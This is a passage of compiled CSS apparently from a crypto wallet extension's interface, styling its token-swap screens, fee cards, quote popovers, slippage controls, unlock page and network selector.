      transition-timing-function: cubic-bezier(0.86, 0, 0.07, 1); }
      @-webkit-keyframes rotate-toggle {
      0% {
      -webkit-transform: rotate(0deg); }
      100% {
      -webkit-transform: rotate(180deg); } }
      .exchange-rate-display--white {
      color: #fff; }
      .fee-card {
      border-radius: 8px;
      border: 1px solid #d6d9dc;
      width: 100%;
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%; }
      .fee-card__main {
      padding: 16px 16px 12px 16px; }
      .fee-card__row-header {
      display: flex;
      align-items: center;
      margin-top: 8px;
      justify-content: space-between; }
      .fee-card__row-header:first-of-type {
      margin-top: 0; }
      .fee-card__row-header div {
      display: flex;
      align-items: center; }
      .fee-card__row-header-text, .fee-card__row-header-text--bold {
      margin-right: 4px;
      cursor: pointer; }
      .fee-card__row, .fee-card__top-bordered-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-top: 8px; }
      .fee-card__top-bordered-row {
      border-top: 1px solid #bbc0c5;
      padding-top: 10px; }
      .fee-card__row-label {
      display: flex;
      align-items: center; }
      .fee-card__row-label img {
      height: 10px;
      width: 10px;
      margin-left: 4px;
      cursor: pointer; }
      .fee-card__info-tooltip-container {
      height: 10px;
      width: 10px;
      justify-content: center;
      margin-top: 2px; }
      .fee-card__info-tooltip-paragraph {
      margin-bottom: 8px; }
      .fee-card__info-tooltip-paragraph:last-of-type {
      margin-bottom: 0; }
      .fee-card__row-fee {
      margin-right: 4px; }
      .fee-card__link {
      color: #037dd6;
      cursor: pointer; }
      .fee-card__total-box {
      border-top: 1px solid #d6d9dc;
      padding: 12px 16px 16px 16px; }
      .fee-card__total-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-weight: bold; }
      .fee-card__total-secondary {
      width: 100%;
      display: flex;
      justify-content: flex-end;
      font-weight: bold;
      color: #6a737d;
      margin-top: 4px; }
      .fee-card__row-header-secondary, .fee-card__row-header-secondary--bold {
      color: #6a737d; }
      .fee-card__row-header-secondary, .fee-card__row-header-secondary--bold {
      margin-right: 12px; }
      .fee-card__row-header-primary, .fee-card__row-header-primary--bold {
      color: #6a737d; }
      .fee-card__row-header-text--bold, .fee-card__row-header-secondary--bold, .fee-card__row-header-primary--bold {
      font-weight: bold; }
      .fee-card__bold {
      font-weight: bold; }
      .info-tooltip > div {
      display: flex;
      align-items: center;
      margin-right: 4px; }
      .intro-popup__liquidity-sources-label {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-weight: bold;
      margin-bottom: 6px;
      color: #24292e; }
      @media screen and (min-width: 576px) {
      .intro-popup__liquidity-sources-label {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%; } }
      .intro-popup__learn-more-header {
      font-style: normal;
      font-weight: normal;
      font-size: 1.125rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-weight: bold;
      margin-bottom: 12px;
      margin-top: 16px; }
      .intro-popup__learn-more-link {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      color: #037dd6;
      margin-bottom: 8px;
      cursor: pointer; }
      .intro-popup__content {
      margin-left: 24px; }
      .intro-popup__content > img {
      width: 96%;
      margin-left: -9px; }
      .intro-popup__footer {
      border-top: none; }
      .intro-popup__button {
      border-radius: 100px;
      height: 44px; }
      .intro-popup__source-logo-container {
      width: 276px;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px 16px;
      background: #f2f3f4;
      border-radius: 8px; }
      @media screen and (min-width: 576px) {
      .intro-popup__source-logo-container {
      width: 412px; }
      .intro-popup__source-logo-container img {
      width: 364px; } }
      @media screen and (min-width: 576px) {
      .intro-popup__popover {
      width: 460px; } }
      .loading-swaps-quotes {
      display: flex;
      flex-flow: column;
      align-items: center;
      flex: 1;
      width: 100%; }
      .loading-swaps-quotes__content {
      height: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      max-height: 445px; }
      .loading-swaps-quotes__quote-counter {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #6a737d;
      margin-top: 3px;
      display: flex;
      justify-content: center;
      width: 100%;
      margin-bottom: 4px; }
      .loading-swaps-quotes__quote-name-check {
      font-style: normal;
      font-weight: normal;
      font-size: 1.125rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-weight: bold;
      color: #24292e;
      display: flex;
      justify-content: center;
      width: 100%;
      text-transform: capitalize; }
      .loading-swaps-quotes__background-1, .loading-swaps-quotes__background-2 {
      width: 265.18px;
      height: 221.02px;
      display: flex;
      justify-content: center;
      align-items: center;
      position: absolute;
      -webkit-animation: spin 38s linear infinite;
      animation: spin 38s linear infinite; }
      @-webkit-keyframes spin {
      100% {
      -webkit-transform: rotate(360deg); } }
      @keyframes spin {
      100% {
      -webkit-transform: rotate(360deg);
      transform: rotate(360deg); } }
      .loading-swaps-quotes__background-2 {
      width: 182.8px;
      height: 195.39px;
      -webkit-animation: spin 42s linear infinite;
      animation: spin 42s linear infinite; }
      .loading-swaps-quotes__mascot-container {
      position: absolute; }
      .loading-swaps-quotes__animation {
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      height: 60%;
      width: 316px; }
      .loading-swaps-quotes__logo {
      position: fixed; }
      .loading-swaps-quotes__logo--transition {
      transition: opacity 0.4s linear; }
      .loading-swaps-quotes__logo div {
      height: 40px;
      width: 94px;
      border-radius: 50px;
      display: flex;
      justify-content: center;
      align-items: center; }
      .loading-swaps-quotes__logo img {
      width: 74px;
      height: 30px; }
      .loading-swaps-quotes__loading-bar-container {
      width: 248px;
      height: 3px;
      background: #d6d9dc;
      display: flex;
      margin-top: 16px; }
      .loading-swaps-quotes__loading-bar {
      height: 3px;
      background: #037dd6;
      transition: width 0.5s linear; }
      .main-quote-summary {
      display: flex;
      flex-flow: column;
      align-items: center;
      position: relative;
      height: 196px;
      width: 100%;
      color: #fff; }
      .main-quote-summary__quote-backdrop-with-top-tab, .main-quote-summary__quote-backdrop {
      position: absolute;
      box-shadow: 0 10px 39px rgba(3, 125, 214, 0.15);
      border-radius: 8px;
      background: #fafcff; }
      .main-quote-summary__quote-backdrop-with-top-tab {
      width: 348px;
      height: 215px; }
      .main-quote-summary__quote-backdrop {
      width: 310px;
      height: 164px; }
      .main-quote-summary__details {
      display: flex;
      flex-flow: column;
      align-items: center;
      width: 310px;
      position: relative; }
      .main-quote-summary__best-quote {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-weight: bold;
      position: relative;
      display: flex;
      padding-top: 6px;
      letter-spacing: 0.12px;
      min-height: 16px; }
      .main-quote-summary__best-quote > span {
      margin-left: 4px; }
      .main-quote-summary__quote-details-top {
      height: 94px;
      display: flex;
      flex-flow: column;
      justify-content: center;
      align-items: center;
      width: 100%;
      padding: 12px;
      padding-top: 2px;
      margin-top: 4px; }
      .main-quote-summary__bold {
      font-weight: 900; }
      .main-quote-summary__quote-small-white {
      white-space: nowrap;
      width: 100%;
      text-align: center;
      font-size: 14px;
      margin-bottom: 8px;
      margin-top: 6px; }
      .main-quote-summary__quote-large {
      display: flex;
      align-items: flex-end; }
      .main-quote-summary__quote-large-number {
      font-size: 40px;
      line-height: 32px;
      margin-right: 6px; }
      .main-quote-summary__quote-large-symbol {
      display: flex;
      align-items: flex-end;
      font-size: 32px;
      line-height: 32px; }
      .main-quote-summary__quote-large-white {
      font-size: 40px;
      text-overflow: ellipsis;
      width: 295px;
      overflow: hidden;
      white-space: nowrap; }
      .main-quote-summary__exchange-rate-container {
      display: flex;
      justify-content: center;
      align-items: center;
      width: 287px;
      border-top: 1px solid rgba(255, 255, 255, 0.2);
      height: 42px; }
      .searchable-item-list {
      background: #fff;
      width: 100%;
      position: relative; }
      .searchable-item-list__search > div {
      border: none;
      border-bottom: 1px solid #d6d9dc;
      border-radius: 0;
      height: 55px;
      font-size: 12px; }
      .searchable-item-list__search > div input {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      color: #6a737d;
      line-height: 100%; }
      .searchable-item-list__search > div input::-webkit-input-placeholder {
      color: #6a737d;
      opacity: 1; }
      .searchable-item-list__search > div input:-moz-placeholder {
      color: #6a737d;
      opacity: 1; }
      .searchable-item-list__search > div input::-moz-placeholder {
      color: #6a737d;
      opacity: 1; }
      .searchable-item-list__search > div input::-ms-input-placeholder {
      color: #6a737d;
      opacity: 1; }
      .searchable-item-list__search > div input::placeholder {
      color: #6a737d;
      opacity: 1; }
      .searchable-item-list__list-container {
      display: flex;
      flex-direction: column;
      overflow-y: scroll; }
      .searchable-item-list__item {
      transition: 200ms ease-in-out;
      display: flex;
      flex-flow: row nowrap;
      align-items: center;
      padding: 8px 12px;
      box-sizing: border-box;
      cursor: pointer;
      border-top: 1px solid #d6d9dc;
      position: relative;
      min-height: 50px; }
      .searchable-item-list__item:first-of-type {
      border-top: none; }
      .searchable-item-list__item:last-of-type {
      border-bottom: 1px solid #d6d9dc; }
      .searchable-item-list__item:hover {
      background: #f2f3f4; }
      .searchable-item-list__item--selected {
      border: 2px solid #7ac9fd !important; }
      .searchable-item-list__item--disabled {
      opacity: 0.4;
      pointer-events: none; }
      .searchable-item-list__item > img {
      margin-top: -2px; }
      .searchable-item-list__primary-label {
      display: flex;
      flex-direction: row;
      align-items: center;
      min-width: 0;
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      line-height: 100%;
      font-weight: bold;
      padding-top: 4px;
      padding-bottom: 3px; }
      .searchable-item-list__item-name {
      /*rtl:ignore*/
      direction: ltr;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap; }
      .searchable-item-list__labels {
      display: flex;
      justify-content: space-between;
      max-width: 237px;
      flex: 1;
      -moz-animation: fadein 1s;
      -webkit-animation: fadein 1s;
      -o-animation: fadein 1s; }
      .searchable-item-list__item-labels {
      display: flex;
      flex-direction: column;
      justify-content: center;
      margin-left: 12px; }
      .searchable-item-list__right-labels {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: flex-end;
      max-width: 100%;
      flex: 1 1 auto; }
      .searchable-item-list__secondary-label, .searchable-item-list__right-primary-label {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      line-height: 100%;
      color: #6a737d;
      text-overflow: ellipsis;
      overflow: hidden;
      white-space: nowrap;
      padding-bottom: 4px; }
      .searchable-item-list__right-primary-label {
      margin-top: 3px; }
      .searchable-item-list__right-secondary-label {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      line-height: 100%;
      color: #6a737d;
      opacity: 0.5;
      text-overflow: ellipsis;
      overflow: hidden;
      white-space: nowrap; }
      .searchable-item-list__list-container {
      z-index: 1002;
      background: white; }
      .searchable-item-list__search {
      z-index: 1001; }
      .searchable-item-list__item--highlighted {
      background: #f2f3f4; }
      .searchable-item-list__identicon {
      margin-top: -2px; }
      .quote-details {
      display: flex;
      flex-flow: column;
      padding-left: 16px;
      padding-right: 16px; }
      .quote-details__detail-header {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #848c96;
      margin-bottom: 2px;
      display: flex; }
      .quote-details__detail-content {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      color: #24292e; }
      .quote-details__detail-content > div {
      justify-content: flex-start; }
      .quote-details__conversion-rate {
      color: #24292e;
      justify-content: flex-start;
      align-items: center;
      height: inherit; }
      .quote-details__conversion-rate .view-quote__conversion-rate-eth-label {
      color: #24292e; }
      .quote-details__conversion-rate i {
      color: #037dd6; }
      .quote-details__conversion-rate * {
      margin-right: 4px; }
      .quote-details .view-quote__view-other-button {
      margin-top: 20px; }
      .quote-details__popover-wrap .popover-content {
      margin-left: 24px; }
      .quote-details__light-grey {
      color: #bbc0c5; }
      .quote-details__row {
      height: 60px;
      padding-top: 16px;
      padding-bottom: 16px;
      display: flex;
      flex-flow: column;
      justify-content: center;
      border-top: 1px solid #d6d9dc; }
      .quote-details__row--high {
      min-height: 60px;
      height: inherit; }
      .quote-details .view-quote__conversion-rate-token-label {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      color: #24292e;
      font-weight: bold;
      margin-left: 2px; }
      .quote-details__metafox-logo {
      width: 17px;
      margin-right: 4px; }
      .quote-details .info-tooltip {
      margin-left: 2px; }
      .quote-details--high {
      min-height: 60px;
      height: inherit; }
      .quote-details__font-small {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%; }
      .quote-details__bold {
      font-weight: bold; }
      .select-quote-popover__button {
      border-radius: 100px;
      height: 39px;
      width: 140px; }
      .select-quote-popover__popover-wrap {
      height: 100%; }
      @media screen and (min-width: 576px) {
      .select-quote-popover__popover-wrap {
      height: 620px;
      width: 348px; } }
      .select-quote-popover__popover-wrap .popover-content {
      height: 100%;
      padding-left: 8px;
      padding-right: 8px; }
      .select-quote-popover__popover-wrap .swaps__footer {
      padding: 16px 24px; }
      .select-quote-popover__popover-bg {
      height: 100%;
      width: 100%;
      background: #d6d9dc;
      opacity: 1; }
      @media screen and (min-width: 576px) {
      .select-quote-popover__popover-bg {
      opacity: 0.5; } }
      .select-quote-popover__sort-list {
      display: flex;
      flex-direction: column;
      align-items: center; }
      .select-quote-popover__column-headers, .select-quote-popover__row {
      display: flex;
      align-items: center;
      padding-left: 20px;
      width: 100%; }
      .select-quote-popover__column-headers > * + *, .select-quote-popover__row > * + * {
      margin-left: 8px; }
      .select-quote-popover__column-headers {
      font-style: normal;
      font-weight: normal;
      font-size: 0.625rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-weight: bold;
      color: #24292e;
      height: 43px;
      margin-bottom: 4px; }
      .select-quote-popover__column-header {
      cursor: pointer;
      font-size: 12px; }
      .select-quote-popover__row {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      cursor: pointer;
      color: #000;
      height: 49px;
      border-bottom: 1px solid #d6d9dc;
      margin-bottom: 8px;
      border-radius: 8px;
      background: #f2f3f4;
      padding-right: 12px;
      border: none; }
      .select-quote-popover__row:hover {
      border: 2px solid #037dd6;
      width: 101%;
      padding-right: 11px;
      padding-left: 19.5px; }
      .select-quote-popover__row--no-hover:hover {
      border: 1px solid #d6d9dc;
      width: 100%;
      padding-right: 12px;
      padding-left: 20px; }
      .select-quote-popover__row--selected {
      color: #fff;
      background: linear-gradient(90deg, #037dd6 0%, #1098fc 101.32%);
      box-shadow: 0 10px 39px rgba(3, 125, 214, 0.15);
      border-radius: 8px;
      border-bottom: none;
      border-top: none;
      height: 64px; }
      .select-quote-popover__row--selected:hover {
      background: linear-gradient(90deg, #037dd6 0%, #1098fc 101.32%);
      width: 100%;
      padding-left: 20px;
      padding-right: 12px;
      border: none; }
      .select-quote-popover__row--selected .select-quote-popover__caret-right {
      color: #fff; }
      .select-quote-popover__row--selected .select-quote-popover__caret-right:hover {
      color: #6a737d; }
      .select-quote-popover__row--selected .select-quote-popover__zero-slippage {
      color: #fff; }
      .select-quote-popover__receiving {
      display: flex;
      flex-direction: column;
      width: 88px; }
      .select-quote-popover__network-fees {
      width: 99px; }
      .select-quote-popover__quote-source {
      width: 28px;
      display: flex;
      align-items: flex-end;
      margin-right: 3px; }
      .select-quote-popover__caret-right {
      color: #6a737d;
      width: 32px;
      height: 32px;
      display: flex;
      justify-content: center;
      align-items: center; }
      .select-quote-popover__caret-right i {
      -webkit-transform: rotate(90deg);
      transform: rotate(90deg); }
      .select-quote-popover__caret-right:hover {
      border-radius: 8px;
      background: white;
      border: 1px solid #037dd6; }
      .select-quote-popover__receiving-value {
      display: flex;
      align-items: center; }
      .select-quote-popover__receiving-value svg {
      margin-right: 2px; }
      .select-quote-popover__receiving-value-text {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap; }
      .select-quote-popover__zero-slippage {
      font-size: 12px;
      line-height: 100%;
      color: #6a737d;
      font-weight: normal; }
      .select-quote-popover__quote-source-toggle {
      margin-left: 2px;
      height: 12px; }
      .select-quote-popover__network-fees-header {
      display: flex;
      flex-direction: row;
      align-items: flex-end; }
      .select-quote-popover__network-fees-header > span {
      width: 77px; }
      .select-quote-popover__network-fees-header > div {
      height: 12px; }
      .select-quote-popover__network-fees-header > svg {
      margin-bottom: 2px; }
      .select-quote-popover__receiving-symbol {
      color: #6a737d; }
      .select-quote-popover__receiving-symbol > div {
      width: 12px;
      height: 12px; }
      .select-quote-popover__receiving-label {
      display: flex;
      align-items: center; }
      .select-quote-popover__receiving-label img {
      height: 10px;
      width: 10px;
      margin-top: 2px; }
      .select-quote-popover__receiving-label > div {
      margin-left: 3px; }
      .select-quote-popover__quote-source-label {
      height: 18px;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      border-radius: 5px;
      padding: 4px;
      font-size: 10px;
      font-weight: bold;
      padding-bottom: 2px; }
      .select-quote-popover__quote-source-label--blue {
      background: #43aefc; }
      .select-quote-popover__quote-source-label--orange {
      background: #f8883b; }
      .select-quote-popover__quote-source-label--green {
      background: #28a745; }
      .slippage-buttons {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      justify-content: center; }
      .slippage-buttons__header {
      display: flex;
      align-items: center;
      color: #037dd6;
      margin-bottom: 0;
      margin-left: auto;
      margin-right: auto;
      cursor: pointer; }
      .slippage-buttons__header--open {
      margin-bottom: 8px; }
      .slippage-buttons__header-text {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      margin-right: 6px;
      color: #037dd6;
      font-weight: 900; }
      .slippage-buttons__content {
      padding-left: 10px; }
      .slippage-buttons__dropdown-content {
      display: flex;
      align-items: center; }
      .slippage-buttons__buttons-prefix {
      display: flex;
      align-items: center;
      margin-right: 8px; }
      .slippage-buttons__prefix-text {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      margin-right: 4px;
      color: black;
      font-weight: 900; }
      .slippage-buttons__error-text {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #d73a49;
      margin-top: 8px; }
      .slippage-buttons__button-group .slippage-buttons__button-group-custom-button {
      cursor: text;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      min-width: 72px;
      margin-right: 0; }
      .slippage-buttons__custom-input {
      display: flex;
      justify-content: center; }
      .slippage-buttons__custom-input input {
      border: none;
      width: 64px;
      text-align: center;
      background: #037dd6;
      color: white;
      font-weight: inherit; }
      .slippage-buttons__custom-input input::-webkit-input-placeholder {
      /* WebKit, Blink, Edge */
      color: white; }
      .slippage-buttons__custom-input input:-moz-placeholder {
      /* Mozilla Firefox 4 to 18 */
      color: white;
      opacity: 1; }
      .slippage-buttons__custom-input input::-moz-placeholder {
      /* Mozilla Firefox 19+ */
      color: white;
      opacity: 1; }
      .slippage-buttons__custom-input input:-ms-input-placeholder {
      /* Internet Explorer 10-11 */
      color: white; }
      .slippage-buttons__custom-input input::-ms-input-placeholder {
      /* Microsoft Edge */
      color: white; }
      .slippage-buttons__custom-input input::placeholder {
      /* Most modern browsers support this now. */
      color: white; }
      .slippage-buttons__custom-input input::-webkit-outer-spin-button,
      .slippage-buttons__custom-input input::-webkit-inner-spin-button {
      /* display: none; <- Crashes Chrome on hover */
      -webkit-appearance: none;
      margin: 0;
      /* <-- Apparently some margin are still there even though it's hidden */ }
      .slippage-buttons__custom-input input[type=number] {
      -moz-appearance: textfield; }
      .slippage-buttons__custom-input--danger input {
      background: #d73a49; }
      .slippage-buttons__percentage-suffix {
      position: absolute;
      right: 5px; }
      .swaps-footer {
      width: 100%; }
      .swaps-footer--warning .btn-primary {
      background: #d73a49;
      border-color: #d73a49; }
      @media screen and (max-width: 576px) {
      .swaps-footer--border .swaps-footer__custom-page-container-footer-class {
      border-top: 1px solid #d2d8dd; } }
      .swaps-footer__custom-page-container-footer-class {
      border-top: none; }
      @media screen and (min-width: 576px) {
      .swaps-footer__custom-page-container-footer-class {
      height: 96px; } }
      .swaps-footer__custom-page-container-footer-button-class {
      border-radius: 100px;
      height: 39px;
      width: 140px; }
      .swaps-footer__custom-page-container-footer-button-class--single {
      width: 307px; }
      .swaps-footer__bottom-text {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #037dd6;
      margin-bottom: 16px;
      cursor: pointer;
      display: flex;
      justify-content: center; }
      @media screen and (min-width: 576px) {
      .swaps-footer__bottom-text {
      margin-top: 0; } }
      @media screen and (max-width: 576px) {
      .swaps-footer__buttons--border .swaps-footer__custom-page-container-footer-class {
      border-top: 1px solid #d2d8dd; } }
      .view-quote {
      display: flex;
      flex-flow: column;
      align-items: center;
      flex: 1;
      width: 100%; }
      .view-quote__content {
      display: flex;
      flex-flow: column;
      align-items: center;
      width: 100%;
      height: 100%;
      padding-left: 20px;
      padding-right: 20px;
      justify-content: space-between; }
      @media screen and (max-width: 576px) {
      .view-quote__content {
      overflow-y: auto;
      max-height: 388px; } }
      @media screen and (min-width: 576px) {
      .view-quote {
      width: 348px; } }
      .view-quote__new-quote-countdown {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-weight: bold; }
      .view-quote__new-quote-countdown--danger span {
      color: #d73a49; }
      .view-quote__view-other-button-container {
      border-radius: 28px;
      width: 100%;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center; }
      .view-quote__view-other-button, .view-quote__view-other-button-fade {
      display: flex;
      align-items: center;
      margin-bottom: 16px;
      position: absolute;
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: white;
      font-weight: bold;
      cursor: pointer;
      border-radius: 28px;
      padding: 5px 18px;
      background: linear-gradient(90deg, #037dd6 0%, #1098fc 101.32%); }
      @media screen and (min-width: 576px) {
      .view-quote__view-other-button, .view-quote__view-other-button-fade {
      font-style: normal;
      font-weight: normal;
      font-size: 0.875rem;
      line-height: 140%;
      margin-bottom: 0; } }
      .view-quote__view-other-button .fa-arrow-right, .view-quote__view-other-button-fade .fa-arrow-right {
      margin-left: 4px;
      font-size: 10px;
      margin-top: 2px; }
      .view-quote__view-other-button-fade {
      background: #0372c3;
      opacity: 0;
      transition: opacity ease-in-out 1s; }
      .view-quote__view-other-button-fade:hover {
      opacity: 1; }
      .view-quote__insufficient-eth-warning-wrapper {
      margin-top: 8px;
      width: 100%;
      align-items: center;
      justify-content: center; }
      @media screen and (min-width: 576px) {
      .view-quote__insufficient-eth-warning-wrapper {
      min-height: 36px;
      display: flex; } }
      .view-quote__bold {
      font-weight: bold; }
      @media screen and (max-width: 576px) {
      .view-quote__countdown-timer-container {
      margin-top: 12px;
      margin-bottom: 16px; }
      .view-quote__countdown-timer-container--thin {
      margin-top: 8px;
      margin-bottom: 8px; }
      .view-quote__countdown-timer-container--thin > div {
      margin-top: 0;
      margin-bottom: 0; } }
      @media screen and (min-width: 576px) {
      .view-quote__countdown-timer-container--thin {
      margin-top: 6px; } }
      .view-quote__fee-card-container {
      width: 100%;
      margin-top: 8px;
      margin-bottom: 8px; }
      @media screen and (min-width: 576px) {
      .view-quote__fee-card-container {
      margin-bottom: 0; }
      .view-quote__fee-card-container--three-rows {
      margin-bottom: -16px; } }
      .view-quote__main-quote-summary-container {
      margin-top: 24px; }
      @media screen and (max-width: 576px) {
      .view-quote__main-quote-summary-container {
      margin-top: 0; } }
      .view-quote__main-quote-summary-container--thin {
      margin-top: 8px; }
      .view-quote__metamask-rate {
      display: flex;
      margin-top: 8%; }
      .view-quote__metamask-rate-text {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #6a737d; }
      .view-quote__metamask-rate-info-icon {
      margin-left: 4px; }
      .swaps {
      display: flex;
      justify-content: center;
      width: 100%; }
      @media screen and (min-width: 576px) {
      .swaps {
      z-index: 12; } }
      .swaps__container {
      display: flex;
      flex-flow: column;
      align-items: center;
      height: 100%;
      width: 100%;
      overflow: hidden; }
      .swaps__container--scrollable {
      overflow: auto; }
      @media screen and (min-width: 576px) {
      .swaps__container {
      width: 460px;
      background: white;
      border: 1px solid #d6d9dc;
      box-shadow: 0 0 7px 0 rgba(0, 0, 0, 0.08);
      border-radius: 8px;
      height: 620px;
      overflow: hidden; } }
      .swaps__content {
      display: flex;
      flex-flow: column;
      align-items: center;
      position: relative;
      width: 100%;
      height: 100%; }
      @media screen and (max-width: 576px) {
      .swaps__content--overflow {
      overflow: scroll; } }
      @media screen and (min-width: 576px) {
      .swaps__content {
      width: 348px; } }
      .swaps__title {
      font-style: normal;
      font-weight: normal;
      font-size: 1rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-weight: bold;
      color: #24292e;
      margin-top: 3px; }
      .swaps__header {
      display: flex;
      flex-flow: column;
      justify-content: center;
      align-items: center;
      padding-top: 0;
      padding-bottom: 16px;
      background: #f2f3f4;
      width: 100%;
      position: relative; }
      @media screen and (min-width: 576px) {
      .swaps__header {
      padding-top: 8px;
      padding-bottom: 8px;
      height: 66px; } }
      .swaps__header-cancel {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      color: #037dd6;
      cursor: pointer;
      position: absolute;
      right: 24px; }
      .unlock-page {
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      align-items: center;
      width: 357px;
      padding: 30px;
      font-weight: 400;
      color: #aeaeae; }
      .unlock-page__container {
      background: #fff;
      display: flex;
      align-self: stretch;
      justify-content: center;
      flex: 1 0 auto; }
      .unlock-page__mascot-container {
      margin-top: 24px; }
      .unlock-page__title {
      margin-top: 5px;
      font-size: 2rem;
      font-weight: 800;
      color: #4d4d4d; }
      .unlock-page__form {
      width: 100%;
      margin: 56px 0 8px; }
      .unlock-page__links {
      margin-top: 25px;
      width: 100%; }
      .unlock-page__link {
      cursor: pointer; }
      .unlock-page__link--import {
      color: #f7861c; }
      .unlock-page__link--use-classic {
      margin-top: 10px; }
      /*
      ITCSS
      http://www.creativebloq.com/web-design/manage-large-css-projects-itcss-101517528
      https://www.xfive.co/blog/itcss-scalable-maintainable-css-architecture/
      DEPRECATED: This CSS architecture is deprecated. The following imports will be removed
      overtime.
      */
      .add-to-address-book-modal__footer, .new-account-modal__footer, .send__select-recipient-wrapper__list__link, .send__select-recipient-wrapper__group-item, .send__select-recipient-wrapper__group-item--selected, .ens-input, .ens-input__wrapper {
      display: flex;
      flex-flow: row nowrap; }
      .add-to-address-book-modal__content, .new-account-modal__content, .send__select-recipient-wrapper, .send__select-recipient-wrapper__recent-group-wrapper, .send__select-recipient-wrapper__group, .send__select-recipient-wrapper__group-item__content, .send__select-recipient-wrapper__group-item--selected__content, .ens-input__wrapper--valid .ens-input__wrapper__input {
      display: flex;
      flex-flow: column nowrap; }
      .send__select-recipient-wrapper__list__back-caret, .ens-input__wrapper__status-icon, .ens-input__wrapper__action-icon {
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center; }
      .ens-input__selected-input__title {
      text-overflow: ellipsis;
      white-space: nowrap;
      overflow: hidden; }
      /*
      Utility Classes
      */
      /* lib */
      .flex-column {
      display: flex;
      flex-direction: column; }
      .flex-row {
      display: flex;
      flex-direction: row; }
      .pointer {
      cursor: pointer; }
      .cursor-pointer {
      cursor: pointer;
      -webkit-transform-origin: center center;
      transform-origin: center center;
      transition: -webkit-transform 50ms ease-in-out;
      transition: transform 50ms ease-in-out;
      transition: transform 50ms ease-in-out, -webkit-transform 50ms ease-in-out; }
      .cursor-pointer:hover {
      -webkit-transform: scale(1.05);
      transform: scale(1.05); }
      .cursor-pointer:active {
      -webkit-transform: scale(0.97);
      transform: scale(0.97); }
      .drop-menu-item {
      display: flex;
      align-items: center; }
      .critical-error {
      text-align: center;
      margin-top: 20px;
      color: #f00; }
      .network-component--disabled {
      cursor: not-allowed; }
      .network-component--disabled .fa-caret-down {
      opacity: 0; }
      .network-component.pointer {
      border: 2px solid #bbc0c5;
      border-radius: 82px;
      padding: 6px 3px;
      flex: 0 0 auto;
      display: flex; }
      .network-component.pointer.ethereum-network .menu-icon-circle div {
      background-color: rgba(3, 135, 137, 0.7) !important; }
      .network-component.pointer.ropsten-test-network .menu-icon-circle div {
      background-color: rgba(233, 21, 80, 0.7) !important; }
      .network-component.pointer.kovan-test-network .menu-icon-circle div {
      background-color: rgba(105, 4, 150, 0.7) !important; }
      .network-component.pointer.rinkeby-test-network .menu-icon-circle div {
      background-color: rgba(235, 179, 63, 0.7) !important; }
      .network-component.pointer.goerli-test-network .menu-icon-circle div {
      background-color: rgba(48, 153, 242, 0.7) !important; }
      .dropdown-menu-item .menu-icon-circle,
